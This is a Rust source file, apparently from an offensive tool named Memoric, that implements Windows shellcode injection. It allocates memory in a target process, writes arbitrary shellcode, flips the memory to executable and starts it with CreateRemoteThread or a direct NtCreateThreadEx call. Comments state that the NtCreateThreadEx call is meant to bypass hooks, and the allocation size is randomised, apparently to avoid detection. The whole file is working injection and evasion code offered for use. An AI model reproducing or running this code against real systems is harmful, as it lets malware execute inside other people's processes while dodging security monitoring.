//! Shellcode injection implementations

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use crate::util::parse_address;
use serde_json::Value;

/// Inject and execute shellcode (W^X compliant: RW alloc → write → RX protect → execute)
pub fn inject_shellcode(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();

    tracing::info!(
        "Injecting {} bytes of shellcode into process {}",
        shellcode_bytes.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Allocate as RW (not RWX) — avoid W^X violation
        let alloc_size = shellcode_bytes.len() + (std::process::id() as usize % 512 + 64); // randomize size
        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Failed to allocate remote memory".to_string(),
            ));
        }

        // Write shellcode while memory is RW
        WriteProcessMemory(
            *handle,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to write shellcode: {}", e)))?;

        // Flip to RX — now executable but not writable
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            remote_mem,
            alloc_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("Failed to set RX protection: {}", e))
        })?;

        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(remote_mem)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to create thread: {}", e)))?;
        let _thread = SafeHandle::new(thread);

        tracing::info!("Shellcode injection successful (W^X compliant)");

        Ok(serde_json::json!({
            "success": true,
            "thread_handle": _thread.0 as u64,
            "remote_address": format!("0x{:016X}", remote_mem as usize),
            "alloc_size": alloc_size,
            "protection": "RW→RX"
        }))
    }
}

/// Create remote thread
pub fn create_remote_thread(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let start_address = args
        .get("shellcode_addr")
        .and_then(parse_address)
        .or_else(|| args.get("start_address").and_then(parse_address))
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed(
                "Missing shellcode_addr, start_address, or address".to_string(),
            )
        })?;

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let thread = CreateRemoteThread(
            *handle,
            None,
            0,
            Some(std::mem::transmute(start_address)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Failed to create thread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "thread_handle": thread.0 as u64
        }))
    }
}

/// NtCreateThreadEx — create thread via direct NT syscall (bypasses CreateRemoteThread hooks)
pub fn nt_create_thread_ex(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let start_address = args
        .get("shellcode_addr")
        .and_then(parse_address)
        .or_else(|| args.get("start_address").and_then(parse_address))
        .or_else(|| args.get("address").and_then(parse_address))
        .ok_or_else(|| {
            MemoricError::InjectionFailed(
                "Missing shellcode_addr, start_address, or address".to_string(),
            )
        })?;
    let suspended = args
        .get("suspended")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::info!(
        "NtCreateThreadEx in PID {} at 0x{:016X}",
        pid,
        start_address
    );

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let mut thread_handle: HANDLE = HANDLE::default();
        let create_flags: u32 = if suspended { 0x1 } else { 0x0 }; // THREAD_CREATE_FLAGS_CREATE_SUSPENDED

        let status = ntapi::ntpsapi::NtCreateThreadEx(
            &mut thread_handle as *mut _ as *mut _,
            0x1FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            (*handle).0 as *mut _,
            start_address as *mut _,
            std::ptr::null_mut(),
            create_flags,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );

        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateThreadEx failed: NTSTATUS 0x{:08X}",
                status
            )));
        }

        let thread = SafeHandle::new(thread_handle);

        Ok(serde_json::json!({
            "success": true,
            "thread_handle": thread.0 as u64,
            "start_address": format!("0x{:016X}", start_address),
            "suspended": suspended,
            "technique": "NtCreateThreadEx (direct syscall)"
        }))
    }
}
